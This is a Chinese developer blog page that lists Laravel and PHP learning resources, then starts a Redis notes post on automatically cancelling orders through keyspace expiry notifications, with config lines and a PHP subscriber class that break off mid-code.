<p><a href="https://github.com/immortalChensm/laravel5.8" target="_blank" rel="noopener">laravel5.8版本源码分析</a></p>
<p><a href="https://learnku.com/laravel/t/30996" target="_blank" rel="noopener">基于 adminLTE3、Laravel、swoole 的微服务管理平台</a></p>
<p><a href="https://learnku.com/articles/25922#topnav" target="_blank" rel="noopener">Laravel-snappy 生成 PDF 踩坑记录</a></p>
<p><a href="https://learnku.com/articles/30878" target="_blank" rel="noopener">docker/laradock 安装</a></p>
<p><a href="https://learnku.com/articles/30858" target="_blank" rel="noopener">Laravel 融合 Markdown</a></p>
<p><a href="https://notes.lzis.me/notes/53" target="_blank" rel="noopener">Laravel框架关键技术解析</a></p>
<p><a href="https://learnku.com/articles/26864" target="_blank" rel="noopener">Laravel Markdown Blog</a></p>
<p><a href="https://github.com/yybawang/Adoc" target="_blank" rel="noopener">laravel markdown api文档</a></p>
<p><a href="https://learnku.com/articles/30607" target="_blank" rel="noopener"> markdown 来撰写文档</a></p>
<p><a href="https://learnku.com/articles/30812" target="_blank" rel="noopener">Laravel 融合 Elasticsearch/Algolia</a></p>
<p><a href="https://learnku.com/articles/22514" target="_blank" rel="noopener">Laravel Artisan 命令大全</a></p>
<p><a href="https://learnku.com/laravel/t/30061" target="_blank" rel="noopener">Laravel 底层分析系列文章：生命周期</a></p>
<p><a href="http://youyou-tech.com/2019/05/30/%E5%A4%A7%E8%AF%9D%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" target="_blank" rel="noopener">大话后端开发高高并发的奇技淫巧</a></p>
<p><a href="https://github.com/medz/cors" target="_blank" rel="noopener"> PHP 跨域的 CORS 中间件</a></p>
<p><a href="https://github.com/nfangxu/package-fx-translation" target="_blank" rel="noopener">Laravel 谷歌翻译</a></p>
<p><a href="https://learnku.com/articles/29669" target="_blank" rel="noopener">Laravel 搭建 Composer 包</a></p>
<p><a href="https://learnku.com/articles/29622" target="_blank" rel="noopener"> Laravel 和 layui 包含基础 RBAC 权限的管理后台</a></p>
<p><a href="https://learnku.com/laravel/t/29566" target="_blank" rel="noopener">生命周期和容器 Container</a></p>
<p><a href="https://github.com/maatwebsite/Laravel-Excel" target="_blank" rel="noopener">Supercharged Excel exports and imports in Laravel</a></p>
<p><a href="https://learnku.com/articles/25270#replies" target="_blank" rel="noopener">MySQL 避坑宝典</a></p>
<p><a href="https://learnku.com/articles/29490" target="_blank" rel="noopener">文章收藏的扩展包</a></p>
<p><a href="https://learnku.com/articles/29413" target="_blank" rel="noopener">多语言与多时区的解决方案</a></p>
<p><a href="https://github.com/immortalChensm/laravel-work" target="_blank" rel="noopener">laravel框架源码分析注解</a></p>
<p><a href="https://github.com/ww285276792/todo.link" target="_blank" rel="noopener">Laravel 团队任务管理系统</a></p>
<p><a href="https://github.com/tangtanglove/fullstack" target="_blank" rel="noopener">基于 Laravel + Ant-design 界面美观漂亮的后台</a></p>
<p><a href="https://github.com/hongyukeji/laravel-translate/" target="_blank" rel="noopener">Laravel 本地语言包自动翻译插件</a></p>
<p><a href="https://learnku.com/articles/28897" target="_blank" rel="noopener">Laravel+Layim+GatewayWorker workerman 实现实时聊天功能</a></p>
<p><a href="https://github.com/ivothgle/Tampermonkey/blob/master/Laravel-doc-help.user.js" target="_blank" rel="noopener">「Laravel 文档助手」 - 油猴脚本</a></p>
<p><a href="https://github.com/hongyukeji/laravel-sms" target="_blank" rel="noopener">Laravel 短信扩展包</a></p>
<p><a href="https://learnku.com/articles/28432#topnav" target="_blank" rel="noopener">Laravel 中的事件监听</a></p>
<p><a href="https://github.com/alicfeng/laravel-runtime" target="_blank" rel="noopener">基于Laravel构建请求信息日志以及接口智能分析</a></p>
<p><a href="https://learnku.com/docs/laravel-cheatsheet/5.8" target="_blank" rel="noopener">Laravel 5.8 速查表</a></p>
<p><a href="https://github.com/Kamicloud/laravel-unofficial-relations" target="_blank" rel="noopener">Laravel 关联模型扩展</a></p>
<p><a href="https://learnku.com/laravel/t/24449#replies" target="_blank" rel="noopener">Laravel 的第三方平台登录</a></p>
<p><a href="https://learnku.com/articles/28230" target="_blank" rel="noopener">Laravel- 访问设备识别组件-BrowserDetect</a></p>
<p><a href="https://www.laravel-dojo.com/helpful-tools" target="_blank" rel="noopener">Laravel 道场</a></p>
<p><a href="https://learnku.com/articles/19427" target="_blank" rel="noopener">Laravel5.5 支付宝支付</a></p>
<p><a href="http://wangyapeng.me/2019/03/30/laravel-broadcasting/" target="_blank" rel="noopener">Laravel 广播</a></p>
<p><a href="http://wangyapeng.me/2019/01/13/upgrad-laravel-5.5-to-5.7-log/" target="_blank" rel="noopener">Laravel 5.5 升级到 5.7 小记</a></p>
<p><a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">生成chm文档</a></p>
<p><a href="https://learnku.com/articles/19859#topnav" target="_blank" rel="noopener">深入研究 Laravel 源码第二天</a></p>
<p><a href="https://github.com/iiDestiny/dependency-injection" target="_blank" rel="noopener">依赖注入扩展包</a></p>
<p><a href="https://github.com/php-casbin/php-casbin" target="_blank" rel="noopener"> PHP 权限管理框架 Casbin</a></p>
<p><a href="https://github.com/foryoufeng/laravel-generator" target="_blank" rel="noopener">laravel 代码生成器 2.0</a></p>
<p><a href="https://learnku.com/blog/Wi1dcard/tags/easy-deployment-of-laravel-applications_50034" target="_blank" rel="noopener">轻松部署 Laravel 应用</a></p>
<p><a href="https://divinglaravel.com/" target="_blank" rel="noopener">深入了解 Laravel 的工作机制</a></p>
<p><a href="https://learnku.com/articles/27934#reply87814" target="_blank" rel="noopener">Laravel 中 IoC 容器</a></p>
<p><a href="https://learnku.com/docs/the-laravel-way/5.6/Tao-1-1/2925" target="_blank" rel="noopener">laravel之道系列</a></p>
<p><a href="https://github.com/kevinyan815/Learning_Laravel_Kernel" target="_blank" rel="noopener">Laravel核心代码学习</a></p>
<p><a href="https://learnku.com/laravel/t/14204/so-what-is-this-register-for" target="_blank" rel="noopener">laravel服务容器</a></p>
<p><a href="https://learnku.com/laravel/t/10781/who-can-compare-the-life-cycle-of-laravel-to-a-more-vivid-image" target="_blank" rel="noopener">Laravel 的生命周期比喻的更形象一点</a></p>
<p><a href="https://learnku.com/articles/26282#topnav" target="_blank" rel="noopener">paypal PHP-sdk 支付 / 回调 / 退款全流程</a></p>
<p><a href="https://github.com/SadCreeper/laravel-react-blog" target="_blank" rel="noopener">Laravel 5.5 和 React 的个人博客系统</a></p>
<p><a href="https://learnku.com/articles/27716" target="_blank" rel="noopener">Laravel 从零单排系列教程</a></p>
<p><a href="https://github.com/eddy8/lightCMS/blob/master/app/functions.php#L65-L103" target="_blank" rel="noopener">基于 Tire 树的敏感词检测</a></p>
<p><a href="https://learnku.com/articles/22307#topnav" target="_blank" rel="noopener">QQ 第三方登录</a></p>
<p><a href="https://learnku.com/articles/27712#topnav" target="_blank" rel="noopener">PHP 有限状态机</a></p>
<p><a href="https://github.com/godruoyi/gblog" target="_blank" rel="noopener">laravel vue博客</a></p>
<p><a href="https://learnku.com/articles/18704" target="_blank" rel="noopener">Voyager 的使用及二次开发</a></p>
<p><a href="https://learnku.com/articles/26344" target="_blank" rel="noopener"> Composer 自动加载源码</a></p>
<p><a href="https://learnku.com/articles/26735#topnav" target="_blank" rel="noopener">GitLab CI 踩坑</a></p>
<p><a href="https://learnku.com/articles/19868#topnav" target="_blank" rel="noopener">小白折腾服务器（一）：docker 搭建 lnmp+ 使用 deployer 部署</a></p>
<p><a href="https://learnku.com/laravel/t/9365/teach-you-to-write-modern-php-code-without-using-a-framework" target="_blank" rel="noopener">不使用框架的情况下也能写出现代化 PHP 代码</a></p>
<p><a href="https://learnku.com/laravel/t/26103" target="_blank" rel="noopener">基于 Laravel 的 CMS</a></p>
<p><a href="https://github.com/Adldap2/Adldap2-Laravel" target="_blank" rel="noopener">Laravel LDAP 包</a></p>
<p><a href="https://learnku.com/articles/27824#reply87460" target="_blank" rel="noopener">PhpSpreadsheet 简单 Excel 导入导出</a></p>
<p><a href="https://learnku.com/articles/25130" target="_blank" rel="noopener">valet 切换 PHP 版本</a></p>
<p><a href="https://github.com/cknow/laravel-money" target="_blank" rel="noopener">Laravel Money 金钱单位格式化</a></p>
<p><a href="https://learnku.com/articles/27806#topnav" target="_blank" rel="noopener">Laravel 中自定义用户登录的数据表users</a></p>
<p><a href="https://learnku.com/articles/14145/rely-on-inversion-control-inversion-ioc-container-dependency-injection#topnav" target="_blank" rel="noopener">浅析依赖倒转、控制反转、IoC 容器、依赖注入</a></p>
<p><a href="https://learnku.com/articles/22769#topnav" target="_blank" rel="noopener">用语言 (非代码) 说清楚 IoC 到底是什么</a></p>
<p><a href="https://1024casts.com/topics/21" target="_blank" rel="noopener">PHP中的依赖注入（DI）容器</a></p>
<p><a href="https://learnku.com/laravel/t/27647#e9289b" target="_blank" rel="noopener">十五个常用的 Laravel 集合</a></p>
<p><a href="https://learnku.com/articles/19195#topnav" target="_blank" rel="noopener">Laravel 服务容器，IoC,DI</a></p>
<p><a href="https://learnku.com/articles/17638" target="_blank" rel="noopener">Laravel 服务容器、服务提供器、契约实例讲解</a></p>
<p><a href="https://learnku.com/articles/19195" target="_blank" rel="noopener">Laravel 服务容器，IoC,DI</a></p>
<p><a href="https://learnku.com/articles/27606#topnav" target="_blank" rel="noopener">《提问的智慧》小测验</a></p>
<p><a href="https://learnku.com/articles/27623" target="_blank" rel="noopener">Laravel 使用 Elasticsearch 全局搜索</a></p>
<p><a href="http://worthly.cn/2018/05/27/algorithm-test/" target="_blank" rel="noopener">PHP实现的一些算法例子</a></p>
<p><a href="http://worthly.cn/2018/06/02/computer-network-reading-notes/" target="_blank" rel="noopener">计算机网络读书笔记</a></p>
<p><a href="http://worthly.cn/2017/12/19/php-regular-preg-match-matching-length-limit/" target="_blank" rel="noopener">正则preg_match匹配长度</a></p>
<p><a href="https://learnku.com/laravel/t/27590" target="_blank" rel="noopener">优酷 YouKu OAuth2 第三方登录库</a></p>
<p><a href="https://github.com/changeweb/Unifiedtransform" target="_blank" rel="noopener">开源学校管理系统</a></p>
<p><a href="https://learnku.com/articles/27556" target="_blank" rel="noopener">超全的设计模式简介</a></p>
<p><a href="https://www.tangshuang.net/1682.html" target="_blank" rel="noopener">如何应对服务器压力</a></p>
<p><a href="https://www.tangshuang.net/6192.html" target="_blank" rel="noopener">数据库中用一个值来保存多种情况：二进制和按位异或</a></p>
<p><a href="https://www.tangshuang.net/1693.html" target="_blank" rel="noopener">在阿里云上搭建自己的git服务器</a></p>
<p><a href="https://learnku.com/articles/27446" target="_blank" rel="noopener">RabbitMQ 的应用场景以及基本原理介绍</a></p>
<p><a href="https://www.tangshuang.net/1774.html" target="_blank" rel="noopener">编译安装nginx1.9.7+php7.0.0</a></p>
<p><a href="https://learnku.com/articles/25947" target="_blank" rel="noopener"> Laravel 开发 API 更得心应手</a></p>
<p><a href="https://learnku.com/articles/22616" target="_blank" rel="noopener">别再使用 JWT 作为 Session 系统</a></p>
<p><a href="https://www.tangshuang.net/4100.html" target="_blank" rel="noopener">同一公司下多产品的用户权限管理系统设计</a></p>
<p><a href="https://github.com/xx19941215/light-tips" target="_blank" rel="noopener">数据结构和算法</a></p>
<p><a href="https://www.tangshuang.net/2794.html" target="_blank" rel="noopener">PHP中关于时间（戳）、时区</a></p>
<p><a href="https://github.com/peinhu/AetherUpload-Laravel" target="_blank" rel="noopener">大文件上传扩展</a></p>
<p><a href="https://learnku.com/laravel/t/26674" target="_blank" rel="noopener">Laravel 微信小程序后端搭建</a></p>
<p><a href="https://tianyong90.com/2019/03/10/yong-algolia-docsearch-qing-song-shi-xian-wen-dang-quan-zhan-sou-suo/#algolia-docsearch-的基本原理和主要优势" target="_blank" rel="noopener"> Algolia DocSearch 轻松实现文档全站搜索</a></p>
<p><a href="https://learnku.com/articles/26987" target="_blank" rel="noopener">SOLID 设计原则</a></p>
<p><a href="https://blog.yiranzai.cn/posts/991/" target="_blank" rel="noopener">MySQL分组查询TOP N的实践和踩坑</a></p>
<p><a href="https://learnku.com/articles/25111#topnav" target="_blank" rel="noopener">不要在循环体中使用 array_merge ()</a></p>
<p><a href="https://github.com/uuk020/logistics" target="_blank" rel="noopener">查询物流信息的扩展包</a></p>
<p><a href="https://learnku.com/laravel/t/27041" target="_blank" rel="noopener">PHPStrom 转 VSCode 折腾记录</a></p>
<p><a href="https://learnku.com/articles/19195" target="_blank" rel="noopener">【看完就懂】Laravel 服务容器，IoC,DI</a></p>
<p><a href="https://learnku.com/articles/25760" target="_blank" rel="noopener">整理 PC 端微信扫码支付全过程 — easywechat + Laravel 5.8</a></p>
<p><a href="https://learnku.com/laravel/t/24161" target="_blank" rel="noopener">Laravel Excel 的五个隐藏功能</a></p>
<p><a href="https://learnku.com/articles/22094" target="_blank" rel="noopener">woann-chat 基于 laravelS 和 layim 的聊天系统</a></p>
<p><a href="https://learnku.com/laravel/t/19023" target="_blank" rel="noopener">Laravel-Excel 3.0 文档</a></p>
<p><a href="https://learnku.com/articles/19589" target="_blank" rel="noopener"> Laravel 进阶教程</a></p>
<p><a href="https://learnku.com/articles/18637" target="_blank" rel="noopener">Laravel Redis 广播 实例</a></p>
<p><a href="https://learnku.com/laravel/t/26281" target="_blank" rel="noopener">基于 The 996 Prohibited License 的项目Laravel-admin-select2</a></p>
<p><a href="https://learnku.com/articles/22046" target="_blank" rel="noopener">处理 API 数据格式</a></p>
<p><a href="https://learnku.com/articles/26733" target="_blank" rel="noopener">Laravel 项目全自动接口管理</a></p>
<p><a href="https://learnku.com/articles/26710#topnav" target="_blank" rel="noopener">Auth 2.0 的一种简单解释</a></p>
<p><a href="https://dmmylove.cn/articles/97" target="_blank" rel="noopener">Laravel 从零单排系列教程 </a></p>
<p><a href="https://learnku.com/articles/24219" target="_blank" rel="noopener">Laravel 5.7 和 JSON Web 令牌（tymon/jwt-auth） - 用户认证</a></p>
<p><a href="https://learnku.com/articles/26343#topnav" target="_blank" rel="noopener">生产环境的 Composer</a></p>
<p><a href="https://learnku.com/laravel/wikis/27707" target="_blank" rel="noopener">输出 SQL 语句</a></p>
<p><a href="https://learnku.com/laravel/t/27688" target="_blank" rel="noopener">Laravel Passport 为你的 REST API 增加用户认证功能</a></p>
<p><a href="https://learnku.com/articles/25111#topnav" target="_blank" rel="noopener">不要在循环体中使用 array_merge ()</a></p>
<p><a href="https://haoruijie.art/2019/04/18/the-secret-of-throttle.html" target="_blank" rel="noopener">Laravel API throttle 限流原理分析</a></p>
<p><a href="https://learnku.com/articles/27389" target="_blank" rel="noopener">Laravel 登录原理剖析</a></p>
<p><a href="https://learnku.com/laravel/wikis/25515" target="_blank" rel="noopener">Laravel 安装和开发环境</a></p>
<p><a href="https://learnku.com/articles/25858" target="_blank" rel="noopener">Cookie 禁用了，Session 还能用吗</a></p>
<p><a href="https://github.com/OMGZui/DesignPattern" target="_blank" rel="noopener">设计模式</a></p>
<p><a href="https://learnku.com/articles/25204" target="_blank" rel="noopener">PHP 详细面试总结</a></p>
<p><a href="https://github.com/baijunyao/design-patterns" target="_blank" rel="noopener">php设计模式 https://baijunyao.com/</a></p>
<p><a href="https://learnku.com/docs/php-design-patterns/2018" target="_blank" rel="noopener">《PHP 设计模式全集 2018》</a></p>
<p><a href="https://learnku.com/articles/26825" target="_blank" rel="noopener">Laravel Markdown Blog</a></p>
<p><a href="https://learnku.com/articles/24982" target="_blank" rel="noopener">设计模式超级简单的解释</a></p>
<p><a href="https://learnku.com/articles/26864#topnav" target="_blank" rel="noopener">Laravel Markdown Blog learnku.net </a></p>
<p><a href="https://learnku.com/articles/26850" target="_blank" rel="noopener">PHP 开发环境安装配置Laradock</a></p>
<p><a href="https://github.com/valiner/identicon-avatar" target="_blank" rel="noopener">头像自动生成</a></p>
<p><a href="https://learnku.com/articles/20990" target="_blank" rel="noopener"> Laravel-admin 集成 Markdown 编辑器</a></p>
<p><a href="https://learnku.com/articles/26180" target="_blank" rel="noopener">swoole 邮件系统</a></p>
<p><a href="https://learnku.com/laravel/t/22814" target="_blank" rel="noopener">Laravel 测试之 —— PHPUnit 入门教程</a></p>
<p><a href="https://learnku.com/articles/26343" target="_blank" rel="noopener">composer 解析</a></p>
<p><a href="https://learnku.com/articles/24217" target="_blank" rel="noopener">Laravel 5.7 撸了一个论坛</a></p>
<p><a href="https://learnku.com/articles/27539" target="_blank" rel="noopener">Laravel 文档助手」 - 油猴脚本</a></p>
<p><a href="https://learnku.com/articles/27029#topnav" target="_blank" rel="noopener">全新搭建 PHP 开发环境</a></p>
<p><a href="https://learnku.com/articles/25444" target="_blank" rel="noopener">编写具有描述性的 RESTful API </a></p>
<p><a href="https://learnku.com/articles/25983" target="_blank" rel="noopener"> Laravel-China 课程文章同步发布</a></p>
<p><a href="https://learnku.com/articles/26686" target="_blank" rel="noopener">代理与反向代理、负载均衡和缓存</a></p>
<p><a href="https://learnku.com/articles/20311" target="_blank" rel="noopener">Laravel5.5 使用 Elasticsearch 做引擎</a></p>
<p><a href="https://learnku.com/laravel/t/22639" target="_blank" rel="noopener">Laravel Eloquent 小技巧</a></p>
<p><a href="https://learnku.com/articles/18697" target="_blank" rel="noopener">Laravel Cron 定时任务 “跳坑” 点</a></p>
<p><a href="https://learnku.com/articles/25798" target="_blank" rel="noopener">Laravel + Laravel-echo + EasyWeChat 实现微信扫码登录</a></p>
<p><a href="https://learnku.com/articles/20247" target="_blank" rel="noopener">你可能不太需要 Laravel-Excel</a></p>
<p><a href="https://learnku.com/articles/21812#99dc86" target="_blank" rel="noopener">Oss Flysystem 扩展</a></p>
<p><a href="https://learnku.com/articles/21522" target="_blank" rel="noopener">Laravel5.6 整合 RabbitMQ 消息队列</a></p>
<p><a href="https://learnku.com/laravel/t/26110" target="_blank" rel="noopener">Laravel 集合（Collection）的基础用法</a></p>
<p><a href="https://learnku.com/articles/20031" target="_blank" rel="noopener">『 OAuth2.0』 猴子都能懂的图解</a></p>
<p><a href="https://learnku.com/laravel/t/22473" target="_blank" rel="noopener"> Laravel 的消息通知系统</a></p>
<p><a href="https://learnku.com/laravel/t/25013" target="_blank" rel="noopener"> Laravel 项目中使用 Elasticsearch 做引擎</a></p>
<p><a href="https://learnku.com/articles/17867" target="_blank" rel="noopener">简聊 Session 与 Token 身份验证</a></p>
<p><a href="https://learnku.com/laravel/t/24767" target="_blank" rel="noopener">六个值得参考的 Laravel 开源项目</a></p>
<p><a href="https://learnku.com/articles/19878" target="_blank" rel="noopener">Laravel 启动流程分析</a></p>
<p><a href="https://learnku.com/articles/25208" target="_blank" rel="noopener">Lumen/Laravel 集成 GatewayWorker (Workerman)，实现简单的聊天系统.</a></p>
<p><a href="https://www.debuginn.cn/study-laravel-1-setting.html" target="_blank" rel="noopener">Laravel踩坑日记之基本配置及Demo</a></p>
<p><a href="https://github.com/Jasongzj/laravel-qcloud-image" target="_blank" rel="noopener">腾讯云智 AI 图像服务的 Laravel SDK</a></p>
<p><a href="https://vien.tech/article/134" target="_blank" rel="noopener">基于Laravel支持markdown的博客Vien Blog</a></p>
<p><a href="https://learnku.com/articles/28578" target="_blank" rel="noopener">Laravel 团队任务管理系统</a></p>
<p><a href="https://learnku.com/articles/27539" target="_blank" rel="noopener">「Laravel 文档助手」 - 油猴脚本</a></p>
<p><a href="https://learnku.com/articles/28637" target="_blank" rel="noopener"> 队列原理分析</a></p>
<p><a href="https://github.com/tsmliyun/laravel_quick_admin" target="_blank" rel="noopener">Laravel + H-ui 搭建后台管理系统</a></p>
<p><a href="https://pinapp.github.io/laravel-shou-ce" target="_blank" rel="noopener">laravel手册</a></p>
<p><a href="https://laravelcode.cn/docs/5.8" target="_blank" rel="noopener">基于 larecipe 做的 Laravel 速查表</a></p>
<p><a href="https://github.com/ratchetphp/Pawl" target="_blank" rel="noopener">Laravel 中连接 Webscoket</a></p>
<p><a href="https://github.com/aoxiang594/infyom-laravel-generator-simple-document" target="_blank" rel="noopener">自动生成 CURD</a></p>
<p><a href="https://github.com/wmhello/laravel_template_with_vue" target="_blank" rel="noopener">laravel5.5和vue.js结合的前后端分离项目模板websocket聊天室</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/redis-记录/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/redis-记录/" itemprop="url">redis 记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-26T11:40:52+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  18.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  80 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="指定时间自动取消订单"><a href="#指定时间自动取消订单" class="headerlink" title="指定时间自动取消订单"></a>指定时间自动取消订单</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) 使用Linux内置的crontab定时任务，每隔几秒甚至几分钟轮训遍历一次数据库，找到超出时间间隔的订单，进行取消。这种办法没有失效性以及在没有订单的时间内属于浪费服务器资源。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>) 使用框架内置的延时处理机制。比如Laravel的队列任务，可以指定多少分钟后执行。这样就能判断订单是否超出时间间隔，是否要取消订单恢复库存量。</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>) 使用Redis的keyspace notification（键空间通知）。Redis可以设置一个key到多久时间后过期,比如:SETEX name <span class="number">123</span> <span class="number">20</span>,设置name在<span class="number">20</span>秒后过期。此时，过期会触发事件发布，所有redis客户端都会订阅，获得相关信息。</span><br><span class="line"><span class="comment">//https://www.guaosi.com/2019/02/25/automatically-cancel-the-order/</span></span><br><span class="line">vim usr/local/etc/redis/redis.conf</span><br><span class="line">notify-keyspace-events <span class="string">"Ex"</span></span><br><span class="line">service redis-server restart /usr/local/etc/redis/redis.conf</span><br><span class="line">会监听<span class="number">0</span>号库所有过期的key</span><br><span class="line">redis-cli</span><br><span class="line">psubscribe __keyevent@<span class="number">0</span>__:expired 监听<span class="number">0</span>号库所有过期的key</span><br><span class="line">setex name <span class="number">5</span> guaosi</span><br><span class="line"><span class="number">5</span>秒后，原终端会输出如下</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>) <span class="string">"pmessage"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"__keyevent@0__:expired"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"__keyevent@0__:expired"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"name"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MRedis</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    private $redis;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造函数</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param string $host 主机号</span></span><br><span class="line"><span class="comment">     * @param int $port 端口号</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$host = <span class="string">'redis'</span>, $port = <span class="number">6379</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis = <span class="keyword">new</span> redis();</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;connect($host, $port);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">expire</span>(<span class="params">$key = null, $time = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;redis-&gt;expire($key, $time);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">psubscribe</span>(<span class="params">$patterns = array(</span>), <span class="title">$callback</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;psubscribe($patterns, $callback);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">setOption</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, <span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//变量$msg就是过期的key的名称，我们只能获取到key的名称，不能获得到原来设置的值。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">$redis, $pattern, $chan, $msg</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 回调函数,这里写处理逻辑</span></span><br><span class="line">    echo <span class="string">"Pattern: $pattern\n"</span>;</span><br><span class="line">    echo <span class="string">"Channel: $chan\n"</span>;</span><br><span class="line">    echo <span 